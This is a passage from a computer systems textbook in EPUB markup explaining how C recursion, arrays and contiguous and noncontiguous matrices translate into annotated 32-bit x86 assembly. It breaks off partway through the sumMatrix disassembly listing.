<p class="indent"><span epub:type="pagebreak" id="page_433"/>The base case in the recursive function <span class="literal">sumr</span> accounts for any values of <em>n</em> that are less than one, and the recursive step adds the current value of <em>n</em> to the result of the function call to <span class="literal">sumr</span> with the value <em>n –</em> 1. Compiling <span class="literal">sumr</span> with the <span class="literal">-m32</span> flag and disassembling it with GDB yields the following assembly code:</p>&#13;
<p class="programs">0x0804841d &lt;+0&gt;:  push  %ebp                  # save ebp<br/>&#13;
0x0804841e &lt;+1&gt;:  mov   %esp,%ebp             # update ebp (new stack frame)<br/>&#13;
0x08048420 &lt;+3&gt;:  sub   $0x8,%esp             # add 8 bytes to stack frame<br/>&#13;
0x08048423 &lt;+6&gt;:  cmp   $0x0,0x8(%ebp)        # compare ebp+8 (n) with 0<br/>&#13;
0x08048427 &lt;+10&gt;: jg    0x8048430 &lt;sumr+19&gt;   # if (n &gt; 0), goto &lt;sumr+19&gt;<br/>&#13;
0x08048429 &lt;+12&gt;: mov   $0x0,%eax             # copy 0 to eax (result)<br/>&#13;
0x0804842e &lt;+17&gt;: jmp   0x8048443 &lt;sumr+38&gt;   # goto &lt;sumr+38&gt;<br/>&#13;
0x08048430 &lt;+19&gt;: mov   0x8(%ebp),%eax        # copy n to eax (result)<br/>&#13;
0x08048433 &lt;+22&gt;: sub   $0x1,%eax             # subtract 1 from n (result--)<br/>&#13;
0x08048436 &lt;+25&gt;: mov   %eax,(%esp)           # copy n-1 to top of stack<br/>&#13;
0x08048439 &lt;+28&gt;: call  0x804841d &lt;sumr&gt;      # call sumr() function<br/>&#13;
0x0804843e &lt;+33&gt;: mov   0x8(%ebp),%edx        # copy n to edx<br/>&#13;
0x08048441 &lt;+36&gt;: add   %edx,%eax             # add n to result (result+=n)<br/>&#13;
0x08048443 &lt;+38&gt;: leave                       # prepare to leave the function<br/>&#13;
0x08048444 &lt;+39&gt;: ret                         # return result</p>&#13;
<p class="indent">Each line in the preceding assembly code is annotated with its English translation. Here, we show the corresponding <span class="literal">goto</span> form (first) and C program without <span class="literal">goto</span> statements (second):</p>&#13;
<p class="margnote">C goto form</p>&#13;
<p class="programs">int sumr(int n) {<br/>&#13;
    int result;<br/>&#13;
    if (n &gt; 0) {<br/>&#13;
        goto body;<br/>&#13;
    }<br/>&#13;
<span epub:type="pagebreak" id="page_434"/>&#13;
    result = 0;<br/>&#13;
    goto done;<br/>&#13;
body:<br/>&#13;
    result = n;<br/>&#13;
    result -= 1;<br/>&#13;
    result = sumr(result);<br/>&#13;
    result += n;<br/>&#13;
done:<br/>&#13;
    return result;<br/>&#13;
}</p>&#13;
<p class="margnote">C version without goto</p>&#13;
<p class="programs">int sumr(int n) {<br/>&#13;
    int result;<br/>&#13;
    if (n &lt;= 0) {<br/>&#13;
        return 0;<br/>&#13;
    }<br/>&#13;
    result = sumr(n-1);<br/>&#13;
    result += n;<br/>&#13;
    return result;<br/>&#13;
}</p>&#13;
<p class="indent">Although this translation may not initially appear to be identical to the original <span class="literal">sumr</span> function, close inspection reveals that the two functions are indeed equivalent.</p>&#13;
<h4 class="h4" id="lev2_153">8.6.1 Animation: Observing How the Call Stack Changes</h4>&#13;
<p class="noindent">As an exercise, we encourage you to draw out the stack and see how the values change. We have provided an animation online that depicts how the stack is updated when we run this function with the value 3.<sup><a href="ch08.xhtml#fn8_2" id="rfn8_2">2</a></sup></p>&#13;
<h3 class="h3" id="lev1_68">8.7 Arrays</h3>&#13;
<p class="noindent">Recall that arrays (see “Introduction to Arrays” on <a href="ch01.xhtml#lev2_9">page 44</a>) are ordered collections of data elements of the same type that are contiguously stored in memory. Statically allocated single-dimension arrays (see the section “Single-Dimensional Arrays” on <a href="ch02.xhtml#lev2_22">page 81</a>) have the form <span class="literal"/> <span class="codeitalic">&lt;type&gt;</span> <span class="literal">arr[N]</span>, where <span class="literal"/> <span class="codeitalic">&lt;type&gt;</span> is the data type, <span class="literal">arr</span> is the identifier associated with the array, and <span class="literal">N</span> is the number of data elements. Declaring an array statically as <span class="literal"/> <span class="codeitalic">&lt;type&gt;</span> <span class="literal">arr[N]</span> or dynamically as <span class="literal">arr = malloc(N*sizeof(</span> <span class="codeitalic">&lt;type&gt;</span><span class="literal">))</span> allocates <span class="literal">N</span> × <span class="literal">sizeof(</span> <span class="codeitalic">&lt;type&gt;</span><span class="literal">)</span> total bytes of memory, with <span class="literal">arr</span> pointing to it.</p>&#13;
<p class="indent">To access the element at index <span class="literal">i</span> in array <span class="literal">arr</span>, use the syntax <span class="literal">arr[i]</span>. Compilers commonly convert array references into pointer arithmetic (see “Pointer Variables” on <a href="ch02.xhtml#lev1_10">page 67</a>) prior to translating to assembly. So, <span class="literal">arr+i</span> is equivalent to <span class="literal">&amp;arr[i]</span>, and <span class="literal">*(arr+i)</span> is equivalent to <span class="literal">arr[i]</span>. Since each data element in <span class="literal">arr</span> is of type <span class="literal"/> <span class="codeitalic">&lt;type&gt;</span>, <span class="literal">arr+i</span> implies that element <span class="literal">i</span> is stored at address <span class="literal">arr</span> + <span class="literal">sizeof(</span> <span class="codeitalic">&lt;type&gt;</span><span class="literal">)</span> × <span class="literal">i</span>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_435"/><a href="ch08.xhtml#ch8tab17">Table 8-17</a> outlines some common array operations and their corresponding assembly instructions. Assume that register <span class="literal">%edx</span> stores the address of <span class="literal">arr</span>, register <span class="literal">%ecx</span> stores the value <span class="literal">i</span>, and register <span class="literal">%eax</span> represents some variable <span class="literal">x</span>.</p>&#13;
<p class="tabcap" id="ch8tab17"><strong>Table 8-17:</strong> Common Array Operations and Their Corresponding Assembly Representations</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:20%"/>&#13;
<col style="width:10%"/>&#13;
<col style="width:70%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Operation</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Type</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Assembly Representation</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">x = arr</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">int *</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">movl %edx,%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">x = arr[0]</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">int</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">movl (%edx),%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">x = arr[i]</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">int</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">movl (%edx,%ecx,4),%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">x = &amp;arr[3]</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">int *</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">leal 0xc(%edx),%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">x = arr+3</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">int *</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">leal 0xc(%edx),%eax</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">x = *(arr+3)</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">int</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">movl 0xc(%edx),%eax</span></p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Pay close attention to the <em>type</em> of each expression in <a href="ch08.xhtml#ch8tab17">Table 8-17</a>. In general, the compiler uses <span class="literal">movl</span> instructions to dereference pointers and the <span class="literal">leal</span> instruction to compute addresses.</p>&#13;
<p class="indent">Notice that to access element <span class="literal">arr[3]</span> (or <span class="literal">*(arr+3)</span> using pointer arithmetic), the compiler performs a memory lookup on address <span class="literal">arr+3*4</span> instead of <span class="literal">arr+3</span>. To understand why this is necessary, recall that any element at index <span class="literal">i</span> in an array is stored at address <span class="literal">arr + sizeof(</span> <span class="codeitalic">&lt;type&gt;</span><span class="literal">) * i</span>. The compiler must therefore multiply the index by the size of the data type to compute the correct offset. Recall also that memory is byte-addressable; offsetting by the correct number of bytes is the same as computing an address.</p>&#13;
<p class="indent">As an example, consider a sample array (<span class="literal">array</span>) with five integer elements (<a href="ch08.xhtml#ch8fig6">Figure 8-6</a>).</p>&#13;
<div class="imagec" id="ch8fig6"><img alt="image" src="../images/08fig06.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-6: The layout of a five-integer array in memory. Each <em>x</em><sub><em>i</em></sub>-labeled box represents one byte, each <span class="literal">int</span> is four bytes.</em></p>&#13;
<p class="indent">Notice that since <span class="literal">array</span> is an array of integers, each element takes up exactly four bytes. Thus, an integer array with five elements consumes 20 bytes of contiguous memory.</p>&#13;
<p class="indent">To compute the address of element 3, the compiler multiplies the index 3 by the data size of the integer type (4) to yield an offset of 12. Sure enough, element 3 in <a href="ch08.xhtml#ch8fig6">Figure 8-6</a> is located at byte offset <em>x</em><sub>12</sub>.</p>&#13;
<p class="indent">Let’s take a look at a simple C function called <span class="literal">sumArray</span> that sums up all the elements in an array:</p>&#13;
<p class="programs">int sumArray(int *array, int length) {<br/>&#13;
    int i, total = 0;<br/>&#13;
<span epub:type="pagebreak" id="page_436"/>&#13;
    for (i = 0; i &lt; length; i++) {<br/>&#13;
        total += array[i];<br/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<p class="indent">The <span class="literal">sumArray</span> function takes the address of an array and the array’s associated length and sums up all the elements in the array. Now take a look at the corresponding assembly for the <span class="literal">sumArray</span> function:</p>&#13;
<p class="programs">&lt;sumArray&gt;:<br/>&#13;
 &lt;+0&gt;:  push %ebp                    # save ebp<br/>&#13;
 &lt;+1&gt;:  mov  %esp,%ebp               # update ebp (new stack frame)<br/>&#13;
 &lt;+3&gt;:  sub  $0x10,%esp              # add 16 bytes to stack frame<br/>&#13;
 &lt;+6&gt;:  movl $0x0,-0x8(%ebp)         # copy 0 to %ebp-8 (total)<br/>&#13;
 &lt;+13&gt;: movl $0x0,-0x4(%ebp)         # copy 0 to %ebp-4 (i)<br/>&#13;
 &lt;+20&gt;: jmp  0x80484ab &lt;sumArray+46&gt; # goto &lt;sumArray+46&gt; (start)<br/>&#13;
 &lt;+22&gt;: mov  -0x4(%ebp),%eax         # copy i to %eax<br/>&#13;
 &lt;+25&gt;: lea  0x0(,%eax,4),%edx       # copy i*4 to %edx<br/>&#13;
 &lt;+32&gt;: mov  0x8(%ebp),%eax          # copy array to %eax<br/>&#13;
 &lt;+35&gt;: add  %edx,%eax               # copy array+i*4 to %eax<br/>&#13;
 &lt;+37&gt;: mov  (%eax),%eax             # copy *(array+i*4) to %eax<br/>&#13;
 &lt;+39&gt;: add  %eax,-0x8(%ebp)         # add *(array+i*4) to total<br/>&#13;
 &lt;+42&gt;: addl $0x1,-0x4(%ebp)         # add 1 to i<br/>&#13;
 &lt;+46&gt;: mov  -0x4(%ebp),%eax         # copy i to %eax<br/>&#13;
 &lt;+49&gt;: cmp  0xc(%ebp),%eax          # compare i with length<br/>&#13;
 &lt;+52&gt;: jl   0x8048493 &lt;sumArray+22&gt; # if i&lt;length goto &lt;sumArray+22&gt; (loop)<br/>&#13;
 &lt;+54&gt;: mov  -0x8(%ebp),%eax         # copy total to eax<br/>&#13;
 &lt;+57&gt;: leave                        # prepare to leave the function<br/>&#13;
 &lt;+58&gt;: ret                          # return total</p>&#13;
<p class="indent">When tracing this assembly code, consider whether the data being accessed represents an address or a value. For example, the instruction at <span class="literal">&lt;sumArray+13&gt;</span> results in <span class="literal">%ebp-4</span> containing a variable of type <span class="literal">int</span>, which is initially set to 0. In contrast, the argument stored at <span class="literal">%ebp+8</span> is the first argument to the function (<span class="literal">array</span>) which is of type <span class="literal">int *</span> and corresponds to the base address of the array. A different variable (which we call <span class="literal">total</span>) is stored at location <span class="literal">%ebp-8</span>.</p>&#13;
<p class="indent">Let’s take a closer look at the five instructions between locations <span class="literal">&lt;sumArray+22&gt;</span> and <span class="literal">&lt;sumArray+39&gt;</span>:</p>&#13;
<p class="programs">&#13;
&lt;+22&gt;: mov  -0x4(%ebp),%eax      # copy i to %eax<br/>&#13;
&lt;+25&gt;: lea  0x0(,%eax,4),%edx    # copy i*4 to %edx<br/>&#13;
&lt;+32&gt;: mov  0x8(%ebp),%eax       # copy array to %eax<br/>&#13;
<span epub:type="pagebreak" id="page_437"/>&lt;+35&gt;: add  %edx,%eax            # copy array+i*4 to %eax<br/>&#13;
&lt;+37&gt;: mov  (%eax),%eax          # copy *(array+i*4) to %eax<br/>&#13;
&lt;+39&gt;: add  %eax,-0x8(%ebp)      # add *(array+i*4) to total (total+=array[i])</p>&#13;
<p class="indent">Recall that the compiler commonly uses <span class="literal">lea</span> to perform simple arithmetic on operands. The operand <span class="literal">0x0(,%eax,4)</span> translates to <span class="literal">%eax*4 + 0x0</span>. Since <span class="literal">%eax</span> holds the value <span class="literal">i</span>, this operation copies the value <span class="literal">i*4</span> to <span class="literal">%edx</span>. At this point, <span class="literal">%edx</span> contains the number of bytes that must be added to calculate the correct offset of <span class="literal">array[i]</span>.</p>&#13;
<p class="indent">The next instruction (<span class="literal">mov 0x8(%ebp),%eax</span>) copies the first argument (the base address of <span class="literal">array</span>) into <span class="literal">%eax</span>. Adding <span class="literal">%edx</span> to <span class="literal">%eax</span> in the next instruction causes <span class="literal">%eax</span> to contain <span class="literal">array+i*4</span>. Recall that the element at index <span class="literal">i</span> in <span class="literal">array</span> is stored at address <span class="literal">array + sizeof(</span> <span class="codeitalic">&lt;type&gt;</span><span class="literal">) * i</span>. Therefore, <span class="literal">%eax</span> now contains the assembly-level computation of the address <span class="literal">&amp;array[i]</span>.</p>&#13;
<p class="indent">The instruction at <span class="literal">&lt;sumArray+37&gt;</span> <em>dereferences</em> the value located at <span class="literal">%eax</span>, placing the value <span class="literal">array[i]</span> into <span class="literal">%eax</span>. Lastly, <span class="literal">%eax</span> is added to the value in <span class="literal">%ebp-8</span>, or <span class="literal">total</span>. Thus, the five instructions between locations <span class="literal">&lt;sumArray+22&gt;</span> and <span class="literal">&lt;sumArray+39&gt;</span> correspond to the line <span class="literal">total += array[i]</span> in the <span class="literal">sumArray</span> function.</p>&#13;
<h3 class="h3" id="lev1_69">8.8 Matrices</h3>&#13;
<p class="noindent">A matrix is a 2D array. A matrix in the C language can be statically allocated as a 2D array (<span class="literal">M[n][m]</span>), dynamically allocated with a single call to <span class="literal">malloc</span>, or dynamically allocated as an array of arrays. Let’s consider the array of arrays implementation. The first array contains <span class="literal">n</span> elements (<span class="literal">M[n]</span>), and each element <span class="literal">M[i]</span> in our matrix contains an array of <span class="literal">m</span> elements. The following code snippets each declare matrices of size 4 × 3:</p>&#13;
<p class="programs">//statically allocated matrix (allocated on stack)<br/>&#13;
int M1[4][3];<br/>&#13;
<br/>&#13;
//dynamically allocated matrix (programmer friendly, allocated on heap)<br/>&#13;
int **M2, i;<br/>&#13;
M2 = malloc(4 * sizeof(int*));<br/>&#13;
for (i = 0; i &lt; 4; i++) {<br/>&#13;
    M2[i] = malloc(3 * sizeof(int));<br/>&#13;
}</p>&#13;
<p class="indent">In the case of the dynamically allocated matrix, the main array contains a contiguous array of <span class="literal">int</span> pointers. Each integer pointer points to a different array in memory. <a href="ch08.xhtml#ch8fig7">Figure 8-7</a> illustrates how we would normally visualize each of these matrices.</p>&#13;
<div class="imagec" id="ch8fig7"><span epub:type="pagebreak" id="page_438"/><img alt="image" src="../images/08fig07.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-7: Illustration of a statically allocated (<span class="literal">M1</span>) and dynamically allocated (<span class="literal">M2</span>) 3 × 4 matrix</em></p>&#13;
<p class="indent">For both of these matrix declarations, element (<em>i</em>, <em>j</em>) can be accessed using the double-indexing syntax <span class="literal">M[i][j]</span>, where <span class="literal">M</span> is either <span class="literal">M1</span> or <span class="literal">M2</span>. However, these matrices are organized differently in memory. Even though both store the elements in their primary array contiguously in memory, our statically allocated matrix also stores all the rows contiguously in memory, as shown in <a href="ch08.xhtml#ch8fig8">Figure 8-8</a>.</p>&#13;
<div class="imagec" id="ch8fig8"><img alt="image" src="../images/08fig08.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-8: Matrix <span class="literal">M1</span>’s memory layout in row-major order</em></p>&#13;
<p class="indent">This contiguous ordering is not guaranteed for <span class="literal">M2</span>. Recall (from “Two-Dimensional Array Memory Layout” on <a href="ch02.xhtml#lev3_13">page 86</a>) that to contiguously allocate an <em>n</em> × <em>m</em> matrix on the heap, we should use a single call to <span class="literal">malloc</span> that allocates <em>n</em> × <em>m</em> elements:</p>&#13;
<p class="programs">//dynamic matrix (allocated on heap, memory efficient way)<br/>&#13;
#define ROWS 4<br/>&#13;
#define COLS 3<br/>&#13;
int *M3;<br/>&#13;
M3  = malloc(ROWS * COLS * sizeof(int));</p>&#13;
<p class="indent">Recall that with the declaration of <span class="literal">M3</span>, element (<em>i</em>, <em>j</em>) <em>cannot</em> be accessed using the <span class="literal">M[i][j]</span> notation. Instead, we must index the element using the format <span class="literal">M3[i*cols + j]</span>.</p>&#13;
<h4 class="h4" id="lev2_154">8.8.1 Contiguous Two-Dimensional Arrays</h4>&#13;
<p class="noindent">Consider a function <span class="literal">sumMat</span> that takes a pointer to a contiguously allocated (either statically allocated or memory-efficiently dynamically allocated) matrix as its first parameter, along with the numbers of rows and columns, and returns the sum of all the elements inside the matrix.</p>&#13;
<p class="indent">We use scaled indexing in the code snippet that follows because it applies to both statically and dynamically allocated contiguous matrices. Recall that the syntax <span class="literal">m[i][j]</span> does not work with the memory-efficient contiguous dynamic allocation previously discussed.</p>&#13;
<span epub:type="pagebreak" id="page_439"/>&#13;
<p class="programs">int sumMat(int *m, int rows, int cols) {<br/>&#13;
    int i, j, total = 0;<br/>&#13;
    for (i = 0; i &lt; rows; i++){<br/>&#13;
        for (j = 0; j &lt; cols; j++){<br/>&#13;
            total += m[i*cols + j];<br/>&#13;
        }<br/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<p class="indent">Here is the corresponding assembly. Each line is annotated with its English translation:</p>&#13;
<p class="programs">&lt;sumMat&gt;:<br/>&#13;
0x08048507 &lt;+0&gt;:  push %ebp                  # save ebp<br/>&#13;
0x08048508 &lt;+1&gt;:  mov  %esp,%ebp             # update ebp (new stack frame)<br/>&#13;
0x0804850a &lt;+3&gt;:  sub  $0x10,%esp            # add 4 more spaces to stack frame<br/>&#13;
0x0804850d &lt;+6&gt;:  movl $0x0,-0xc(%ebp)       # copy 0 to ebp-12 (total)<br/>&#13;
0x08048514 &lt;+13&gt;: movl $0x0,-0x4(%ebp)       # copy 0 to ebp-4 (i)<br/>&#13;
0x0804851b &lt;+20&gt;: jmp  0x8048555 &lt;sumMat+78&gt; # goto &lt;sumMat+78&gt;<br/>&#13;
0x0804851d &lt;+22&gt;: movl $0x0,-0x8(%ebp)       # copy 0 to ebp-8 (j)<br/>&#13;
0x08048524 &lt;+29&gt;: jmp  0x8048549 &lt;sumMat+66&gt; # goto &lt;sumMat+66&gt;<br/>&#13;
0x08048526 &lt;+31&gt;: mov  -0x4(%ebp),%eax       # copy i to eax<br/>&#13;
0x08048529 &lt;+34&gt;: imul 0x10(%ebp),%eax       # multiply i * cols, place in eax<br/>&#13;
0x0804852d &lt;+38&gt;: mov  %eax,%edx             # copy i*cols to edx<br/>&#13;
0x0804852f &lt;+40&gt;: mov  -0x8(%ebp),%eax       # copy j to %eax<br/>&#13;
0x08048532 &lt;+43&gt;: add  %edx,%eax             # add i*cols with j, place in eax<br/>&#13;
0x08048534 &lt;+45&gt;: lea  0x0(,%eax,4),%edx     # mult (i*cols+j) by 4,put in edx<br/>&#13;
0x0804853b &lt;+52&gt;: mov  0x8(%ebp),%eax        # copy m pointer to eax<br/>&#13;
0x0804853e &lt;+55&gt;: add  %edx,%eax             # add m to (i*cols+j)*4,put in eax<br/>&#13;
0x08048540 &lt;+57&gt;: mov  (%eax),%eax           # copy m[i*cols+j] to eax<br/>&#13;
0x08048542 &lt;+59&gt;: add  %eax,-0xc(%ebp)       # add eax to total<br/>&#13;
0x08048545 &lt;+62&gt;: addl $0x1,-0x8(%ebp)       # increment j by 1 (j+=1)<br/>&#13;
0x08048549 &lt;+66&gt;: mov  -0x8(%ebp),%eax       # copy j to eax<br/>&#13;
0x0804854c &lt;+69&gt;: cmp  0x10(%ebp),%eax       # compare j with cols<br/>&#13;
0x0804854f &lt;+72&gt;: jl   0x8048526 &lt;sumMat+31&gt; # if (j &lt; cols) goto &lt;sumMat+31&gt;<br/>&#13;
0x08048551 &lt;+74&gt;: addl $0x1,-0x4(%ebp)       # add 1 to i (i+=1)<br/>&#13;
0x08048555 &lt;+78&gt;: mov  -0x4(%ebp),%eax       # copy i to eax<br/>&#13;
0x08048558 &lt;+81&gt;: cmp  0xc(%ebp),%eax        # compare i with rows<br/>&#13;
0x0804855b &lt;+84&gt;: jl   0x804851d &lt;sumMat+22&gt; # if (i &lt; rows) goto sumMat+22<br/>&#13;
0x0804855d &lt;+86&gt;: mov  -0xc(%ebp),%eax       # copy total to eax<br/>&#13;
0x08048560 &lt;+89&gt;: leave                      # prepare to leave the function<br/>&#13;
0x08048561 &lt;+90&gt;: ret                        # return total</p>&#13;
<p class="indent">The local variables <span class="literal">i</span>, <span class="literal">j</span>, and <span class="literal">total</span> are loaded at addresses <span class="literal">%ebp-4</span>, <span class="literal">%ebp-8</span>, and <span class="literal">%ebp-12</span> on the stack, respectively. The input parameters <span class="literal">m</span>, <span class="literal">row</span>, and <span class="literal">cols</span> are located at locations <span class="literal">%ebp+8</span>, <span class="literal">%ebp+12</span>, and <span class="literal">%ebp+16</span>, respectively. Using this <span epub:type="pagebreak" id="page_440"/>knowledge, let’s zoom in on the component that just deals with the access of element (<em>i</em>, <em>j</em>) in our matrix:</p>&#13;
<p class="programs">0x08048526 &lt;+31&gt;: mov  -0x4(%ebp),%eax    # copy i to eax<br/>&#13;
0x08048529 &lt;+34&gt;: imul 0x10(%ebp),%eax    # multiply i with cols, place in eax<br/>&#13;
0x0804852d &lt;+38&gt;: mov  %eax,%edx          # copy i*cols to edx</p>&#13;
<p class="indent">The first set of instructions computes <span class="literal">i * cols</span> and places the result in register <span class="literal">%edx</span>. Recall that for a matrix named <span class="literal">matrix</span>, <span class="literal">matrix + (i * cols)</span> is equivalent to <span class="literal">&amp;matrix[i]</span>.</p>&#13;
<p class="programs">0x0804852f &lt;+40&gt;: mov -0x8(%ebp),%eax   # copy j to eax<br/>&#13;
0x08048532 &lt;+43&gt;: add %edx,%eax         # add i*cols with j, place in eax<br/>&#13;
0x08048534 &lt;+45&gt;: lea 0x0(,%eax,4),%edx # multiply (i*cols+j) by 4, put in edx</p>&#13;
<p class="indent">The next set of instructions computes <span class="literal">(i * cols + j) * 4</span>. The compiler multiplies the index <span class="literal">(i * cols) + j</span> by four because each element in the matrix is a four-byte integer, and this multiplication enables the compiler to calculate the correct offset.</p>&#13;
<p class="indent">The last set of instructions adds the calculated offset to the matrix pointer and dereferences it to yield the value of element (<em>i</em>, <em>j</em>):</p>&#13;
<p class="programs">0x0804853b &lt;+52&gt;: mov 0x8(%ebp),%eax    # copy m pointer to eax<br/>&#13;
0x0804853e &lt;+55&gt;: add %edx,%eax         # add m to (i*cols+j)*4, place in eax<br/>&#13;
0x08048540 &lt;+57&gt;: mov (%eax),%eax       # copy m[i*cols+j] to eax<br/>&#13;
0x08048542 &lt;+59&gt;: add %eax,-0xc(%ebp)   # add eax to total</p>&#13;
<p class="indent">The first instruction loads the address of matrix <span class="literal">m</span> into register <span class="literal">%eax</span>. The <span class="literal">add</span> instruction adds the offset <span class="literal">(i*cols + j)*4</span> to the address of <span class="literal">m</span> to correctly calculate the address of element (<em>i</em>, <em>j</em>) and then places this address in register <span class="literal">%eax</span>. The third instruction dereferences <span class="literal">%eax</span> and places the resulting value in register <span class="literal">%eax</span>. The last instruction adds the value in <span class="literal">%eax</span> to the accumulator <span class="literal">total</span>, which is located at stack address <span class="literal">%ebp-0xc</span>.</p>&#13;
<p class="indent">Let’s consider how element (1,2) is accessed in <a href="ch08.xhtml#ch8fig9">Figure 8-9</a>.</p>&#13;
<div class="imagec" id="ch8fig9"><img alt="image" src="../images/08fig09.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-9: Matrix <span class="literal">M1</span>’s memory layout in row-major order</em></p>&#13;
<p class="indent">Element (1,2) is located at address <span class="literal">M1 + (1 * COLS) + 2</span>. Since <span class="literal">COLS</span> = 3, element (1,2) corresponds to <span class="literal">M1+5</span>. To access the element at this location, the compiler must multiply 5 by the size of the <span class="literal">int</span> data type (four bytes), yielding the offset <span class="literal">M1+20</span>, which corresponds to byte <em>x</em><sub>20</sub> in the figure. Dereferencing this location yields element 5, which is indeed element (1,2) in the matrix.</p>&#13;
<h4 class="h4" id="lev2_155"><span epub:type="pagebreak" id="page_441"/>8.8.2 Noncontiguous Matrix</h4>&#13;
<p class="noindent">The noncontiguous matrix implementation is a bit more complicated. <a href="ch08.xhtml#ch8fig10">Figure 8-10</a> visualizes how <span class="literal">M2</span> may be laid out in memory.</p>&#13;
<div class="imagec" id="ch8fig10"><img alt="image" src="../images/08fig10.jpg"/></div>&#13;
<p class="figcap"><em>Figure 8-10: Matrix <span class="literal">M2</span>’s noncontiguous layout in memory</em></p>&#13;
<p class="indent">Notice that the array of pointers is contiguous, and that each array pointed to by an element of <span class="literal">M2</span> (e.g., <span class="literal">M2[i]</span>) is contiguous. However, the individual arrays are not contiguous with one another.</p>&#13;
<p class="indent">The <span class="literal">sumMatrix</span> function in the following example takes an array of integer pointers (called <span class="literal">matrix</span>) as its first parameter, and a number of rows and columns as its second and third parameters:</p>&#13;
<p class="programs">int sumMatrix(int **matrix, int rows, int cols) {<br/>&#13;
    int i, j, total=0;<br/>&#13;
    <br/>&#13;
    for (i = 0; i &lt; rows; i++) {<br/>&#13;
        for (j = 0; j &lt; cols; j++) {<br/>&#13;
            total += matrix[i][j];<br/>&#13;
        }<br/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<p class="indent">Even though this function looks nearly identical to the <span class="literal">sumMat</span> function shown earlier, the matrix accepted by this function consists of a contiguous array of <em>pointers</em>. Each pointer contains the address of a separate contiguous array, which corresponds to a separate row in the matrix.</p>&#13;
<p class="indent">The corresponding assembly for <span class="literal">sumMatrix</span> follows. Each line is annotated with its English translation.</p>&#13;
<p class="programs">0x080484ad &lt;+0&gt;:  push %ebp                     # save ebp<br/>&#13;
0x080484ae &lt;+1&gt;:  mov  %esp,%ebp                # update ebp (new stack frame)<br/>&#13;
0x080484b0 &lt;+3&gt;:  sub  $0x10,%esp               # add 4 spaces to stack frame<br/>&#13;
0x080484b3 &lt;+6&gt;:  movl $0x0,-0xc(%ebp)          # copy 0 to %ebp-12 (total)<br/>&#13;
0x080484ba &lt;+13&gt;: movl $0x0,-0x4(%ebp)          # copy 0 to %ebp-4 (i)<br/>&#13;
0x080484c1 &lt;+20&gt;: jmp  0x80484fa &lt;sumMatrix+77&gt; # goto &lt;sumMatrix+77&gt;<br/>&#13;
0x080484c3 &lt;+22&gt;: movl $0x0,-0x8(%ebp)          # copy 0 to %ebp-8 (j)<br/>&#13;
0x080484ca &lt;+29&gt;: jmp  0x80484ee &lt;sumMatrix+65&gt; # goto &lt;sumMatrix+65&gt;<br/>&#13;
<span epub:type="pagebreak" id="page_442"/>&#13;
0x080484cc &lt;+31&gt;: mov  -0x4(%ebp),%eax          # copy i to %eax<br/>&#13;
0x080484cf &lt;+34&gt;: lea  0x0(,%eax,4),%edx        # mult i by 4, place in %edx<br/>&#13;
0x080484d6 &lt;+41&gt;: mov  0x8(%ebp),%eax           # copy matrix to %eax<br/>&#13;
0x080484d9 &lt;+44&gt;: add  %edx,%eax                # put (i * 4) + matrix in %eax<br/>&#13;
0x080484db &lt;+46&gt;: mov  (%eax),%eax              # copy matrix[i] to %eax<br/>&#13;
0x080484dd &lt;+48&gt;: mov  -0x8(%ebp),%edx          # copy j to %edx<br/>&#13;
0x080484e0 &lt;+51&gt;: shl  $0x2,%edx                # mult j by 4, place in %edx<br/>&#13;
0x080484e3 &lt;+54&gt;: add  %edx,%eax                # put (j*4)+matrix[i] in %eax<br/>&#13;
0x080484e5 &lt;+56&gt;: mov  (%eax),%eax              # copy matrix[i][j] to %eax<br/>&#13;
0x080484e7 &lt;+58&gt;: add  %eax,-0xc(%ebp)          # add matrix[i][j] to total<br/>&#13;
0x080484ea &lt;+61&gt;: addl $0x1,-0x8(%ebp)          # add 1 to j (j+=1)<br/>&#13;
0x080484ee &lt;+65&gt;: mov  -0x8(%ebp),%eax          # copy j to %eax<br/>&#13;
0x080484f1 &lt;+68&gt;: cmp  0x10(%ebp),%eax          # compare j with cols<br/>&#13;
0x080484f4 &lt;+71&gt;: jl   0x80484cc &lt;sumMatrix+31&gt; # if j&lt;cols goto&lt;sumMatrix+31&gt;<br/>&#13;
0x080484f6 &lt;+73&gt;: addl $0x1,-0x4(%ebp)          # add 1 to i (i+=1)<br/>&#13;
